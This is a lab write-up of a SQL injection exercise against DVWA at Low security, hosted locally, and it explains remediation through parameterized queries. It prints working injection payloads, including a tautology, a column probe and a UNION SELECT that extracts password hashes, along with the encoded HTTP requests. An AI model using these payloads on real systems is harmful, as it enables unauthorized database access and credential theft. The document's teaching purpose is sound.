# CyberSecurity Task 3: SQL Injection on DVWA (Low Security)

## 1. Objective
The objective of this task is to demonstrate, analyze, and remediate a **SQL Injection (SQLi)** vulnerability in a controlled, educational sandbox environment using **Damn Vulnerable Web Application (DVWA)** configured at the **Low** security level. This lab illustrates how unvalidated user inputs manipulate database query execution, establishes normal application behavior versus exploited states, and demonstrates definitive defensive remediation using **parameterized queries (prepared statements)**.

## 2. Scope
- **Target Application**: Damn Vulnerable Web Application (DVWA) v1.10* running on local sandbox infrastructure.
- **Security Posture**: Low Security Level (no input filtering, sanitization, or parameterization in backend PHP script).
- **Vulnerability Focus**: SQL Injection Module (`/vulnerabilities/sqli/`).
- **Controlled Demonstrations**:
  1. Baseline verification using legitimate user input (`1`).
  2. Boolean tautology exploitation (`1' OR '1'='1`).
  3. UNION-based information disclosure (`1' UNION SELECT user, password FROM users #`).
- **Ethical Mandate**: Testing is strictly confined to the local educational sandbox. No live, production, or unauthorized web applications were tested.

## 3. Tools
- **Damn Vulnerable Web Application (DVWA)**: Intentionally vulnerable PHP/MySQL web application for training.
- **Docker / Apache / PHP / MySQL**: Local containerized or virtualized hosting environment.
- **Web Browser**: Chromium / Firefox developer tools.
- **Optional Proxy**: OWASP ZAP or Burp Suite Community Edition for HTTP request inspection.

## 4. Environment
- **Host**: Windows 11 Workstation.
- **Container / VM**: Local Docker container (`vulnerables/web-dvwa`) or local XAMPP/LAMP stack on `localhost:8080`.
- **Database Engine**: MySQL / MariaDB.
- **Language**: PHP 7.x / 8.x with `mysqli` driver.

## 5. Installation / Setup

### Running DVWA via Docker (Recommended Lab Setup)
```bash
# Pull and run the official educational DVWA container locally
docker run --rm -d -p 8080:80 --name dvwa-lab vulnerables/web-dvwa

# Verify container is running
docker ps --filter name=dvwa-lab
```

### Initial Application Setup
1. Open a local browser and navigate to: `http://localhost:8080/setup.php`
2. Click **Create / Reset Database** to initialize default tables and sample users.
3. Log in with the default training credentials:
   - **Username**: `admin`
   - **Password**: `password`
4. In the left navigation bar, select **DVWA Security** and set the security dropdown to **Low**, then click **Submit**.
5. Select the **SQL Injection** tab in the sidebar.

---

## 6. Implementation Steps

### Step 1: Establish Normal Application Behavior
1. In the "User ID" input form, submit a legitimate ID: `1`.
2. Observe the application response:
   ```text
   ID: 1
   First name: admin
   Surname: admin
   ```
3. *Interpretation*: The application takes the input integer, constructs `SELECT first_name, last_name FROM users WHERE user_id = '1'`, and returns a single matching user record.

### Step 2: Controlled Test 1 — Boolean Tautology (Extract All Records)
1. Submit the following payload into the input box:
   ```text
   1' OR '1'='1
   ```
2. Observe the application response:
   - Instead of a single user, the application outputs all five user accounts in the database (`admin`, `Gordon`, `Hack`, `Pablo`, `Bob`).
3. *Interpretation*: The `'` breaks out of the intended data literal. The appended `OR '1'='1'` makes the SQL `WHERE` clause always evaluate to `TRUE`, forcing the database to return every row in the table.

### Step 3: Controlled Test 2 — UNION-Based Credential Extraction
1. Verify column count compatibility:
   ```text
   1' ORDER BY 2 #
   ```
   *(Returns successfully; confirming the query selects exactly two columns).*
2. Submit the UNION payload:
   ```text
   1' UNION SELECT user, password FROM users #
   ```
3. Observe the application response:
   - In addition to user names, the application outputs the raw account usernames and MD5 password hashes from the internal `users` table:
   ```text
   ID: 1' UNION SELECT user, password FROM users #
   First name: admin
   Surname: 5f4dcc3b5aa765d61d8327deb882cf99
   ```

### Step 4: Technical Analysis & Remediation
Review [`sql_injection_notes.md`](sql_injection_notes.md) for complete PHP code comparison and parameterized query implementation.

---

## 7. Commands Used & HTTP Interactions

```http
# Normal Request
GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1
Host: localhost:8080

# Injected Payload 1 (Boolean Tautology)
GET /vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit HTTP/1.1
Host: localhost:8080

# Injected Payload 2 (UNION Data Extraction)
GET /vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users+%23&Submit=Submit HTTP/1.1
Host: localhost:8080
```

---

## 8. Results
The injection exercises successfully demonstrated full read-access compromise of the underlying table due to raw string concatenation. Detailed execution logs, query breakdowns, and parser execution flows are recorded in [`sql_injection_notes.md`](sql_injection_notes.md).

---

## 9. Security Analysis

### What SQL Injection Is
In computer software, **data** should never be mistaken for **instructions**. SQL injection occurs when an application accepts input from an external user and concatenates it directly into a database query string. The database parser cannot differentiate between the developer's original SQL commands and the characters submitted by the user.

### Why Crafted Input Alters SQL Behavior
Consider the developer's query template:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```
When `$id` is set to `1' OR '1'='1`, the string becomes:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```
The quote character `'` is a syntactic delimiter in SQL. By injecting a quote, the attacker ends the string literal early and injects new SQL language tokens (`OR`, `UNION`, `SELECT`, `--`, `#`). The database treats the attacker's words as instructions rather than data.

### How Parameterized Queries Prevent the Flaw
Parameterized queries (Prepared Statements) completely eliminate SQL injection at the compiler level:
1. The SQL query structure is sent to the database and compiled **before** any user input is processed.
2. The user input is transmitted separately across the wire as a bounded parameter.
3. The SQL parser never re-compiles the query; it treats the parameter strictly as a raw literal string or integer. Even if an attacker supplies `1' OR '1'='1`, the database merely looks for a user whose literal ID is the characters `1' OR '1'='1`, completely neutralizing the attack.

---

## 10. Evidence & Screenshot Mapping
Visual records of testing are cataloged in [`screenshots/`](screenshots/):
- `screenshots/01_dvwa_security_low.png`: DVWA security level configured to "Low".
- `screenshots/02_normal_behavior_id1.png`: Normal query execution for User ID `1`.
- `screenshots/03_sqli_boolean_all_users.png`: Exploit Test 1 output displaying all records via boolean bypass.
- `screenshots/04_sqli_union_password_hashes.png`: Exploit Test 2 output extracting database password hashes via UNION SELECT.

---

## 11. Lessons Learned
- **Blacklisting Is Ineffective**: Attempting to sanitize input by stripping quotes or keywords (like `OR` or `SELECT`) frequently fails due to alternate encodings (URL encoding, hex, nested keywords).
- **Prepared Statements Are Mandatory**: Modern application frameworks (Django ORM, SQLAlchemy, Spring Data, Hibernate, PHP PDO) must be configured to use prepared statements by default.
- **Password Storage**: The extracted password hashes (`5f4dcc3b5aa7...`) illustrate that legacy MD5 hashing without salts provides negligible security; modern password storage must use salted, adaptive algorithms such as bcrypt, Argon2, or PBKDF2.

## 12. Limitations
- Low security DVWA does not employ escaping or filtering; higher security levels introduce server-side token validation, parameterized queries, and CSRF protection, requiring different analysis techniques.
- Testing in this lab demonstrated read-only data extraction; in production misconfigurations with administrative database privileges, SQL injection can enable file writes (`INTO OUTFILE`) and remote operating system command execution (`xp_cmdshell`).

## 13. Ethical-Use Statement
All techniques demonstrated in this task were executed strictly against a local, intentionally vulnerable educational laboratory application (DVWA). Attempting SQL injection or data extraction against unauthorized public, commercial, or institutional databases is a serious criminal offense. These skills are developed strictly for secure coding verification, defensive auditing, and vulnerability remediation.
